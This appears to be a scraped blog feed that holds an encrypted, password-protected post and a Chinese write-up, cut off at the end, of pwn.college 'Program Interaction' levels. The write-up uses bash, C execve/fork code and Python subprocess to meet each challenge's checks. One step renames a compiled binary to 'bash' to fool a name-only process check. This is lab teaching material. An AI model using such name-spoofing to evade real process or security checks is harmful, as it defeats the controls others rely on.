c8a25df58af23b7287d22bad1c2c54950b636bb54752e0b74ae9841a4957609b2c8e51bf2607962af4b3532c5d716ddaa8d73709e808ab4f8599b06f10b0072849d0b0f69894b78797b8033f9e9741587bfec793c4af2a5ea2856f96250d6fd083b89efc7c13dbf7c5f81c711aa44cb1f5722eadecb07dc495211f8d8f2f87b9b2911a2f976447b6586e76ae3335e1d8ad2f2dc75751c9b62755f744f027c917c55c3539b13bda6d629d8bdbf747bbd8e19755dd5ae553eceda0d010c81f83a886a1d500cfac51572e73d73c573879ac6fb668ce027662d50bd58f9626ab9ddb8f69c131d3894fba1a11f49bde5ee72a27535e4a324740e0bf776bc3a934dfd7de17e99387d87e58f8db96114710c4a4c1aeb6a1b96df1846b1bda905204dc18cff16ea0b446099fa80791a918df0e6d51385b52d5d965122a4f97cb3d1473f778cc1129261e0ebe28d47c8e1f94b4f203b2c00f0ced7eb75e98a3f3e556ea30463e824134bbb339daa4bbe908440994a5a4b9666564bb4d871a0e3c042ac8ec538dd0973d4249a433d886fb1b5c45899a5b1f29e1339fcf4cb39d255fdb08ecd2062802b9300121ca101e1fa3c84e4c181974c3cf086b539d996889d83037c3b3b10d613d172ba5b9c2089aaab5393fe819369f4b43c7d8d1974c4bc603f3e5065c1f1c0182b37db3a2cae7225763fae0cb9be0ecd6ac9c5c2354a20e4d98e492d827486c08a4a724c466f9d468206010f8d1233f0ca062fa10727d6723e7afa7ce34192977045475d66785aab7d4cb5f31ccf647477bb88f86c5eee2e29c5ed8ee9b07f405aa82c6c65fd26252ff24fe6cdcd74e9e5409e7129a44ed74383d17b16514ebbad5dd715474e9d88223b80d5e1c25a02a3ca09556b62c9eec4eef3a8d77c4e3ae51bae16a0d0c14896c1137c2054dff9b1e0c453f3b1d94bf183e456b74223bca8473562293c5828b0b597257d969503d6dce155c14836df137fd8058e4a61d9a4d19298b24bff5e7abe3e7f200b6bdda5fc5d67a61d23580b439862291a572662b7bc59a771a0e49c9bf0e896cfbc7154547d85182f073220aa22e7d7ce6cfd6a195cbaa2b3cd2b3732e525063ea8b32be986c7d15c95e2448b96c87a9434fa52901af3c26fe21e3a8e9800313eb590463d5db2d6f8105d4cbb2f285b0efcb7bb64df7f79f548e3dcd56a6eb0127f8f377ed01cc25dfffb4434267ce1f44bfbee8b4ed39ab73b8a55849b7a609cf34d1a86ffa7a98fe7b8dde79aab521567ef993d84a95672ed9e5ebaa73665856a9ee123e913eed1e9d001806f7634e0bbc55f48f1c111a63590ddd598222f1dcee80e47643cab63abc4e62ece76970cb6b8a3a2d2b2a551866dbf9e5df1808527fd02974210ff7f329160629669fda733e32c7fe8ab294fa167589e257ea25daaa94011fcd0b79b5229147edc8b9526b2220328e3f57f9b9fa5014e3eda385cb1beb34692688bcaad8078205941db0ecdfe139a129b79a2823525c6e5e3e52c22d30864bdcd0ac83075a34ad1b3e7cd911aeb729e06ee27d7ffda5584efa2a7b55c762ef65b339bdb0c4b1f8d1f49846f2a9ffb5758f6204791ff7be666bd3093fb4f07200e11305faa21e35ced058e29c5b9d384a42a204905e990e763cbc56014185af11862f10790f29d09d51277f3bc15f0b9dfbf98e33a9f061e5429b432aa59d7883813dfc2527cedadae675f428bc552814146fb98a33ec1da3752454dfed3ea0dd75a7612f28984bf7e8931d26f149f939a988e50a6c91984dbd7784d2661f2ba0dd0db481b8cc76413257e52b27bceb63bfc357c860e9fb17b312e7d0545ef6b04ad2e11ecc196599fef3bcf1bc06236ecd8b34663c2f3ef82e4dfdbb3dca71c05471de2f1e5584495b3697e322df1a68633f269e36579937cbc9f7c094bfd61208acb4d5a46c3aba77e4dc8f25148d5e04a974641f0c1c376233eac1c7b165f052dfe72cf14e934de7f8b9096af22d0704761fb4bc940fb8116c3bda9819ff1e08711feb642c6a59f5bfefa7521ce37a668985a06d71d2ebede9809d2c36c7d83e3a50713800d52fc6f7f8201f37d1c4c287f0e876b6c29b6b3483b1979f24dc1ffceb1fc17ea2231cf93eb5da250872847c304b9300295216264e2d8d605565f687c81a6affe1189a739eca6f5c9d382e577c816861c9315fbdcb6afd37b2ae28893db60ff92cd9b7b9712f80d3340250a13f1fcab90d6efbf393189db38e85d807d0cf785f135d52569348e70256b77dc4285a57857b2ff9f480824f2ea663300e20d5951824525a4b740ae66934e50eed408b52fdb1dc9f8622c4d7d154215c483a143e4048be92c00424ba879badb2a1a8246d18e300d0f733a193dafd45350057dccfbd3831a715d034c0858045dd5fc1f410d66d795d5bcdbe820e3f9ea1e38fcf45edf70305c9fd578daa7debc34ff46a5bfc854e90fe4e780184cc20087fd76b5e5ed8a0016c43385526c6a7db92069f32d9271cfac53d6f045e09e629ee6529c03276bbeb01823f29a4d52feb6e0180f455186d37789debc96718ee31baffc9eaedc114f63b38e7aac0a77f5d97022fb3fe312e315c3d1d8302bf0b3c41d38ce140a09f5fe6dedfd1aa3e58ea80be4c2693fdee03d1ca57e67ff1cdc030625a258d5b969f14d6471fa8b3cf274767731182938488e5cdd0e9ba9972dad800897f2817e42f9280f12699dbce25d914a620632203bb6583b7497d66766c6ea3811ded53e042e09833b2164dc1abfb1d86c341e5062788d8b949226732ae29cd46dc6525172a6f9450e046febe30e0f223f62dcf8c4def982531882e3fc5dd6dd60f014659305e338dba081c3c523c742460060d1f23c6e16a672d678a9f7aff0087fbb6a364319c47e71827e18926b110bd33a51ed5410742198154e92915673455881bdd859bc6862d809858739a85bc4d9b8756595f681bbf5667ca7d9b59ad43eed568dad6e10c51f5d9a7b5641ecd677b023bc5b356f556a1b1fba708f844340e5626d137a854052c8cadf4b493d2a806e9e91e8ad7d31fa883ef7dc349840d0a702db818abe4b206b50675b001952a0ff9f2b18d260d4447a8ba39819e231be5d4e0a357becdb5d52935e7b428b419394fb21c08bf61eda06b50ebd898806c7bc230d8487b9928f9750b6328f133530eda29e73233ba30775bd5cfb1379f32bd562eeeda012c47b17ff2550a7517bd642eb64ba2a93ac82740ca801d3e5a1d43861e233befee0650cc468f5ba4669995534debc5957586669245f2f6510aff876345abae2bec7e4532dea2eac4fa4339ab681cb45816bdb325344e13a9a27f4c6498f5772046a918ef6d87ad0eefd7e6dca5fabdae48dcbfbc18d94108e9b8484fb15ab60009e31af02a3c023343be9e8fe3215dd1a602a1b5a94cba524ff6ebb845c919af9f664a8d85027723f8336b951af213fd9613ffefb34ec6eae4ddb284ed8d958cc601c268f06f60b4f578ad9bc2318527a409741ba5aba64f7534e720ca22116b7f3c6cc2d329a82802decc5f6254c77e6c63d2cbdd6353841c1d6eb9805fc71ac2f0b18b28e1a01ce542dc903babff7009c61ab889ec9894b49a86d4746c3f00c95e1db4a3b62683bd3195b2f3044506665a99e08ebcae7bdd10ff5ff8efd917a59260459d489c6b0e68e8319aafefc811285c2634aa074a8f4e33f0900c459b050e6ecc2d6b8e1c226c9af750c549fd6db22a9010643ee0f6d8f3f2df3cc5c38980c50b03cb2b0b88a82197c58c19cc51add206547959778d0fd8765d384f28cad384fb945e65bed133be0005e4399e9b1138c3e542df02ea9dc40a02df8d08dc046ec9721fcd3ea967cdf80f6d73c7778692e3f6a078748362e0d3316f4d4422bf2f5041a8e679552c2cc8236a2e7bfb47d9eb275496494a472c43db75a236d3b5eae7709e2a26649678bcfb5cc2d25db1e2528edf5829e260f510f6a17de778b145a51fd31010d12902bd5f4f3e0057adb6be41bdf29234754d0f5bcf40196bdd8565a3378272261cf8b48c1e76790fffb82981bcf8cf6ea2310f78af70fb9b76c06a095b7528e1d1c9b63f9f57fc303c9f809bd7a82c2851c80b709c1731a6b94019b46b30ffbbe7b9ae2e21ca3d3df0b8f79809da29f5d5b6ae3b2a0f172191bf561820f99a545a12c6dab5d436cb15c3b274bf1eceb325157e5f51a44ffb1cafb3cbf79593a590a3a3ab5b336a9041bfc1e6e51404ddc69dc28976abac83433b6a7d020eda88d2b94c64ff14f7675742be49a0276a52592c04ed5b7a440f3e4abc855c435cedafe2534d855a8f9d5a39b72a21179d21b6fefe15c3cc2e7658e4e740adf099bf6170de3ef6987e67619b0449967a2819db6398eaa95ff474951d0f516d3536e27b91e230a8820cbf47286cc05b47b9eac6d642fff0d7841cc9b3d7cfdc6cc67ec693f28117de8fb41141860e95f62f2468e9e0b9ed082658aeb4cb15c44eb328be8c74362d60efedd2fbd86e95dd5c7cf50631a3f5ebdd5fcea34dd49a38584c89d942352f224ed0d40a069d423e153fdccb988ae03bab3d5eb566d3cd9a6dc9349a3346883171b8dde899b77d666aa93f7743341233849d5d8e9534d8f064642df695ef4e2f19ae5069265520197d75f4e488a23a18e041cdd1dfba7fc400717f6feab03887f3ae75482932aeae2e0637f6c648f8f0cff5cb025e6141a1396895af039e3449c5c87bd397e01b53b967fb0ebeaaa24a90e11704b3f6dd930052de80efbab552d071513d78d628ec9ff79cfaafb85100c36fccbf71a727b7477d3baa0b0b38da2d62144c519bb6bca92aeae76333f223a19b2cb3a6c4e28e5ef217bc4c69376bf287f62e3c91f3d8ac67cbc66d3be389e715aaa9e8a390513cc12c94102b5e52f72efb867312b1160020ddcd0ecc14b3c883e0d11a2b0fb61bf55817cd1f2fc88f59dbf816880503cb8188ae3e81b32cf9b2568f607a09897aa9c0e53fe8c8a5643fa987f1cca9a0b493544df8b722ffaf051d12ac35fdb7be258537da04dcb38d239cdaf1883b694f34eb58763c8f682b5aee51de958b38373a19ba20c595c6c67accb43bd7df2048592fa8b899217a7c9af6efbd052456bf88c6257f253922164dcabee6e3ff74238d97cfd4e690078e1d927df05d1f9eb2036a1f67a5a9d5f4f3b7f7475a7bd5c85b3e291e8310194cbac0cde4a54bd0198972d4a1c96c8184ea86925f98bd7e264b79862d7cf35951d259ff036915557835b6dad0a290ef822dc6dbda5ae693eb5a4342356555d7eca6e9af808560d1ce5d709716d1cc439b486260fd4e3fba5d029363997f243956342a49cc3b21e578916a84e6618c96ccccf6f96324b5677964320c633e7b3fc53bea6462653cf28b5f17a5c7a390bc917d9bae40441e4d0894f18aa102765b4d7a6f368bbda50d676c56605f1b9831a99925d523c637ef2a5b767671d54d78f7246bc2f63bfb1f4cec1f7507e6f3bffaacc9a25e9a142f84846d8683e5f22b34f85ea5302d2c8b25753821321bffda00bc1abe836941ab4ca9b2977e83490bfa3be0f150ca0713756ad47225acb24fa7424121b6d84260b7e032cc1e4b87ac9140acc87090c500e363e927cb29449e5988ae3c4606da10ae492d20870483f51734a0a2c072d73f7bc23089df72f1cec2c4365aab16a2241d9c804b875407337ad9eb324d9fdd1c40e650c4296a4ce55f1d41d45cbf032ef08a9fa7bbfdaf870d214785c2edb883b8983e231e447f12775124ddbe9803868002ed5fa1fb4df84dfb972bd3ee17b4acf8f3227d8893964999198498d9f5d1b3ba00604a712769b859beadf0088e50ae9374f85de37ce4f12ac79b2ab00db624da77123821827f278e5585cf7320b68855fc70658d00f186f87d7c8479bcaf38d6daa1b4e878ba1402fe193e50490538fbaac42570f105881d03e2ff0bbcad05081171e34cccaa72606207faa3018efbdadce15ea0da643134cea461a06edee31a87e532886445bc9ebb9a20efa43f0c88a8fefa353902b9d09bb9e1e3aa4b503be26667d7db27c7ff1f8f72aa8c92c2417cc8fd25447f1f52b5b5bac89453660bb111896a06a84a798253eb34a9419e5f14fd1838a78f8ff5a0ca2cba3ac5dc188ba66dd46fc44bb3fe1bffe6800f7986aa643b311af4059e96e4728f97165de244642812b9b79b6fecae692a655f3bae19ac8870ad9fe338c7d0000f4aa7059acc35359ceb8ba1c459c38480bd7c5adb73ae81569c8d2cee8681c66a5ad10535baece3c67c3f03565203b32c076658e503efb712e0b210f9e11c1c91a686c0fb818ef612269566d4f08dfac633e972a3af52363565211c766608ecbcba9049264e022438cef57dee8fc1236b818a07f2d527a91d44fc1adc1be2b2ed9f95ee11de1f714becf352315efb94b4debdead65e69ab4eb4895313f3176dd716dc99629fa88f3d9070eb680f1e1038a598dd61b6ed4928a6d36ba7116111ef26fde11a303d5fb2e554b44fb661bb4bf2f6bee6c3304c4d9218e766a0dea79cc06a0418d5a55c878d63ac7b8bc5a87fd166df94c6cbd8e622b1d814255118d9ecb64e5092aee523984b0714aa5f16bd3bfabb8cdd1af721663d7ae5a37296a083a3d2fd2916541d29b3a3aae955d3e2e23a3de9c5656a6a6ff0bdda12e06005fc0208e39991f503eee6c8c93e83f9b89ff1420f889cc4ec5cfa2d81b1ee0ea3c5ba82db398345ab581b88a9a090b5cbeabc5c2721851ecacbfff8d4866acd318f1b6db9d1204b98ec91002f75682b174c2c8f25deb65dc3b8f0a062d6315bfa8bc9082246d6ae88d39b8d2230da2a7aced6799b7680126c1d8d442549f23b11758352a3e818914068761f8655b00b84360ff4a4c569940f1dda88cc7386ecedc2e4d25253a66ab5e6300c494d00cd1b3f6b9ea9e93736e0dfbf1dc88e6b574b7b6fb4a38218b852153590a67418139a1eafc5eef681ab101b6fef8c9f5e3fb524f430c29ddabca15268847fd3d025ed615ebf1d124d0ee3eaee5c53aefca17fb8d66fa2f84363a35cd7ef9f2d19cff0aad47119a5a0ad34a47a98b8e21903f4041f8b7a8d815db2903d8731bcf62bc56ebe47c58a3f3fdb4f3269475276f910ec4db28050cf777f27a8dca00d9f09f15466db6cc1b0fa506f3da88ff2d03d4925dcf41fe49b57714605d4173b60fba109a6c23923f674f0aa8e98df63d846de8e52a9c100a79dd9b1258826bd02652e8a054a94bf847ce658c2e16a9f05cb9f6465bb26656a536b84d8395b4a6882359d00276b45a05eecaba0a59ba9deeb7887a16d2c7d29c29fa497d225e21e734f6c74c2ec626575b3713197cd2f0e488209f06ab0a17fdcd8f8f9c3da9cf9cbc89a46639f11fb9967e103a3b361feda3a507cce13ef46b98ae0c38acc358d4049f17f54d82cefa582bf6a788de74ad75852282a0fd689d441a127414f1d361c74d4e96b936dae1d276308a7b9886b1e6d18361bc69544fad2c8cae1545927e19145cb1d88379906995eecc216c66f65d7e551dd9fd34a633d603b0d4b0f0a1a27c55ab8c9477f2e27ae8f4b12cb7b54c937fe5914356775adee2a9cfaf20db0af3df386b75e5798b28019c48dfb852fd8aa660d56a6b224fef68523e59d40730fa1f08bcbd5ad86f1729d7441b8afc4deb72abe44b08e4ac4cbd18b58d4da8ee8d1d839aebaf5e78323c510aaf4f4811119035e71104d58b829708eb35182451a520102f2d32a04ac9949eae97bf2bcab4212e43771e82fe4eb5fe29a29bc88e0ea16106d5d5b393f7b14af5955685e12cb8021871484e38dce3d0479de983740082d16953cc0c96fc59cf40d790a15840384ddfd0fb1971ac2edc79eccccbe6e07d77c19f94b41b9aaba6dd5730495ce2dc7842e7d8cf7b4975e6ef9d1371076254af89a5d27b943622fee09d63f10bdd5e5087cbe1365d83a6947c9c31319e66994eb1f6be9b5b4a1e52bae960d4941e1f64a4fc16093d574cf9264a4f61ef09aa782b394514965a1285f494672a72989e3044e21cc5721493c76bd262603b4bc2b5d5bf9daa3a19108d66f2592d70f99ff6532644dc4eedfe661bbac57aa44fc2533892b5cc85f24cc5eccdd539a924bbf5b8cc78d1ebe93c1d6e708eb2a74aeb77c536b7d9da678dcc860b9d3228d53d26414ea206f174417c775a18801118e6becd717731d9a71e664ae0eef07327d573b9db6d1e256692507500a76c1ba1f78e9e74a2ead5bcaff90c45df8bfdc56df9fe70f823468ad0ef1edcb948b5c25101b98c31fdb64703e2538bcdb611b06ef99b5b226130f6c7b987b5fd6fd68e6b8ff6aab83c4cbcc10cd98e8bcd65341cc2ccf0368bf2c37b536cecff34849db292fabf5e5617cda3035e711246c05d3a9b4b703c4e7b13fc8604814921f413cce50831306f50c057d9cbccce4fb1caa3f257bf2cd44d851610b49bbc6a198bf23ad60b36033502ecda2a11cc1164bf970672ae58d65204a762e36082bb46be84f6b313a6504e947420954e810ac57cbd9fa519f6948517b4f9d8a1a9c1d73292050d1ebcc8010bc94e6cc7e92780308e7003a0fc263544a4cce76950a43528d0f211204753526f4f895394ffe2a8032cf44fc5d76985dc1b4bef6f580881436c30cc0c24b93c12745cad8b357523c350f16d54102027e7071c91c4b15a949302f365640b45e8350a77e77a65f81d718684d3a7ce1eaa1c1bf814213e7bcf12d9f1c647795b8d44c0a94fd5f761c2c5c6a8937813b8ae30e8adb6a3d240bd9a5d3c6c24597dd7b64e9055c569a3f7ef24345b9a43d8354e8930142d39572a33dd733a7d75a0a7b4f1e1465f33b3c5b094dc4cb066cdade8d69cdbc816d5598b05017ea63a5d846b200f499e01ae807bf0937f4834c345a71201d40e5ca3a9aab0ccd843c7feac48a4a449e8cb7438f677dd8a0ec2788c5dbd65b931fd2b251ed49e28a6d6ec975e931bdade0f0592a98e204f6eb93b761d9cdac24a5672ef780d521b6fb2665dd26eaba2c149f8cf12fe2ea26696813f89eff44a08e475fe4c8eb52a6be577277654a905bd69228cb59e98e0487883706fc7b9a2fe74db423c5864f4869ac1784c1e4f97947756e1fe055ac0479109903b6240cafaa3b28e524426b72a1078ef085582e973211d828c58f3f670493735b63b4fcb2f75c4baefac27185466db5d78f8b60faeb4d0f56bb54f38b69c50061eb560b41b26a153eeffd9e56c30fe3baedcf8dbaab174502ece792eecedafc5ba99608ac646792cf727649ee869db160bc6206ddf2d7e14eaa398280529755435d9f501af8688667cfddbd63b6b3f94cf9197065228caed50cb3f618ec285dd085dce7be57ff48a5555660cba4cfa43c60c6c355545129491d409dfc204ea1efcf4f46fe7318125fa411a816d799b7d3dfd3a088445450ee1cc11b14e1b33bd5b6b397b1d4fe1c3f12f63f50562148e702f1d74413635678f869bfab17ac2c69b4e358db00974c5ff8583bb0cbf1fe346b5efc40bba250e5d9a9db2529f1921fb23ec401db189cec2cd8a3b8869a4fce962afb2f07bccdb6a038fbfdb413e77e9e53488405744cd690814a0126e8c4b91cac40cf96a9c2ed4b0b32c8688af9714f1188b91823eac9f529c303324a8990bc323958610bcae37e07b0c34250bb3a169fb8e311e3f89e99a542f5096992b007236cab947b62e9c3f11d30c3511c5f2f4e5db1557c448abc7e56c9f873dea605a932ac3d9ea9f088547075e8ee638a151ec24a28179158e30e3aae3ddf5706eb7cea4a5b56eb43d987bcb9cfc8075b0ec7b27b6750fd56e6cfe6bf3e5db370feda3b1086531bcbbac982a0600b782c8370b844a7471116ffdd055446726439331a24a73639aee4510a94103e4715fa77c9afe884f4325849ec4bbb5d768f0492d4c82a8db1963937bee1af5bc746217bc961b454caa</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn.college(1)</title>
    <link href="/posts/9b840b21.html"/>
    <url>/posts/9b840b21.html</url>
    
    <content type="html"><![CDATA[<h1 id="dojo的一些小技巧"><a class="markdownIt-Anchor" href="#dojo的一些小技巧"></a> Dojo的一些小技巧</h1><ul><li><p>推荐使用vscode连接，这样方便更改脚本的代码，不然使用ssh连接改代码真的慢还头疼。但是注意vscode它会自作主张，给运行程序加一些参数，具体看 Program Interaction的level 1</p></li><li><p>远程连接 <code>ssh -i key hacker@dojo.pwn.college</code></p></li><li><p>所以推荐首先vscode搞起，运行不成功再ssh连接试一试</p></li></ul><h1 id="program-interaction"><a class="markdownIt-Anchor" href="#program-interaction"></a> Program Interaction</h1><h2 id="level-1"><a class="markdownIt-Anchor" href="#level-1"></a> level 1</h2><blockquote><p>要求使用bash启动程序，但是vscode的terminal会自动添加一些程序执行参数，这些可能影响检测</p></blockquote><h3 id="wp1"><a class="markdownIt-Anchor" href="#wp1"></a> wp1</h3><p>​在使用ssh或者桌面版bash的情况下，该命令执行即可。但是用vscode的terminal时，它会自动添加一些程序执行参数，导致检测失败，无法获得flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/challenge/embryoio_level1<br></code></pre></td></tr></table></figure><h3 id="wp2"><a class="markdownIt-Anchor" href="#wp2"></a> wp2</h3><p>​这里使用 <code>execve</code> ，它并不会创建一个新的进程，而是替换当前进程的内容。因此，新程序的执行环境会取代原始进程的执行环境，包括进程ID(PID)。也就是说，如果在一个Shell中执行C程序，并且该C程序中包含了 <code>execve</code> 调用，那么新程序会在Shell的进程上下文中运行，而不会创建一个新的进程</p><p>​所以这里编译后(编译后的文件名随意)在ssh和桌面版执行就是使用bash执行了，但是问题是用vscode的terminal时还会出现参数问题，怀疑还是vscode执行时瞎添加</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwncollege</span><span class="hljs-params">(<span class="hljs-type">char</span>* argv[],<span class="hljs-type">char</span> *env[])</span>&#123;<br>    <span class="hljs-type">char</span> *args[] = &#123;<span class="hljs-literal">NULL</span>&#125;;<br>    execve(<span class="hljs-string">&quot;/challenge/embryoio_level1&quot;</span>, args, env);<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[], <span class="hljs-type">char</span>* env[])</span>&#123;<br>    pwncollege(argv,env);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="wp3"><a class="markdownIt-Anchor" href="#wp3"></a> wp3</h3><p>​这里增加一层父子进程，使用子进程来执行 <code>execve</code> ，但是这里子进程的父进程不是 <code>bash</code> ，不能通过检测。观察 <code>checker.py</code> 中检测 bash 的代码，发现它只检测名称。所以可以先将c文件编译成名字为 <code>bash</code> 的文件，然后这样就可以通过检测了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_bash</span>(<span class="hljs-params">process</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[TEST] Checking to make sure the process is the bash shell. If this is a check for the parent process, then,&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[TEST] most likely, this is what you do by default anyways, but we&#x27;ll check just in case...&quot;</span>)<br>    check_exe_basename(process, <span class="hljs-string">&#x27;bash&#x27;</span>)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(process.cmdline()) == <span class="hljs-number">1</span>, <span class="hljs-string">f&quot;The shell process must be running in its default, interactive mode (/bin/bash with no commandline arguments). Your commandline arguments are: <span class="hljs-subst">&#123;process.cmdline()&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><p>​c代码，通过 <code>gcc tmp.c -o bash</code> 来编译，之后使用 <code>./bash</code> ，然后这样在ssh，桌面版，还是vscode的terminal中，都可以运行成功，拿到flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwncollege</span><span class="hljs-params">(<span class="hljs-type">char</span>* argv[],<span class="hljs-type">char</span> *env[])</span>&#123;<br>    <span class="hljs-type">char</span> *args[]=&#123;<span class="hljs-literal">NULL</span>&#125;;<br>    execve(<span class="hljs-string">&quot;/challenge/embryoio_level1&quot;</span>, args, env);<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span>* argv[],<span class="hljs-type">char</span>* env[])</span>&#123;<br>    <span class="hljs-type">pid_t</span> pid;<br>    pid=fork();<br>    <span class="hljs-keyword">if</span> (pid==<span class="hljs-number">0</span>)&#123;<br>        pwncollege(argv,env);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        wait(<span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="level-4"><a class="markdownIt-Anchor" href="#level-4"></a> level 4</h2><blockquote><p>环境变量的设置</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> yqxjyb=isdvinxiir<br>./challenge/embryoio_level4<br></code></pre></td></tr></table></figure><h2 id="level-5"><a class="markdownIt-Anchor" href="#level-5"></a> level 5</h2><blockquote><p>一开始没搞懂，后来知道是重定向到文件的stdin，而不是0</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> yorlicln &gt; /tmp/tlvzpz<br>./challenge/embryoio_level5 &lt; /tmp/tlvzpz<br></code></pre></td></tr></table></figure><h2 id="level-7"><a class="markdownIt-Anchor" href="#level-7"></a> level 7</h2><blockquote><p>主要是不知道环境变量的设置问题</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 提示</span><br>- the challenge checks <span class="hljs-keyword">for</span> a specific parent process : bash<br>- the challenge will check that the environment is empty (except LC_CTYPE, <span class="hljs-built_in">which</span> is impossible to get rid of <span class="hljs-keyword">in</span> some cases)<br><span class="hljs-comment"># 这就是要求运行时环境变量为空，而env -i 中env用于运行命令时设置环境变量的命令，-i表示在执行命令时忽略当前环境中的所有环境变量</span><br><br><span class="hljs-comment"># 做法</span><br><span class="hljs-built_in">env</span> -i /challenge/embryoio_level7<br></code></pre></td></tr></table></figure><h2 id="level-11"><a class="markdownIt-Anchor" href="#level-11"></a> level 11</h2><blockquote><p>使用bash运行tmp.sh程序</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> ugdygr=ybezdhyzoq<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/challenge/embryoio_level11 ugdygr&#x27;</span> &gt; tmp.sh<br>bash tmp.sh<br></code></pre></td></tr></table></figure><h2 id="level-15"><a class="markdownIt-Anchor" href="#level-15"></a> level 15</h2><blockquote><p>使用ipython来执行特定的语句</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ipython<br>import subprocess<br>subprocess.Popen(<span class="hljs-string">&quot;/challenge/embryoio_level15&quot;</span>)<span class="hljs-comment"># 这里使用run也是打开程序，有时候Popen会被认为docker-init</span><br></code></pre></td></tr></table></figure><h2 id="level-19-21"><a class="markdownIt-Anchor" href="#level-19-21"></a> level 19-21</h2><blockquote><p>这里就是专注于subprocess库的使用</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-built_in">echo</span> agpgvmpu &gt; /tmp/vngscc<br>ipython<br>import subprocess<br><span class="hljs-comment"># 标准输入</span><br>subprocess.run(<span class="hljs-string">&quot;/challenge/embryoio_level19&quot;</span>, stdin=open(<span class="hljs-string">&quot;/tmp/vngscc&quot;</span>))<br><span class="hljs-comment"># 标准输出</span><br>subprocess.run(<span class="hljs-string">&quot;/tmp/ultuey&quot;</span>, shell=True)  <span class="hljs-comment">#执行shell命令需设置为True</span><br>subprocess.run(<span class="hljs-string">&quot;/challenge/embryoio_level20&quot;</span>, stdout=open(<span class="hljs-string">&quot;/tmp/ultuey&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>))  <span 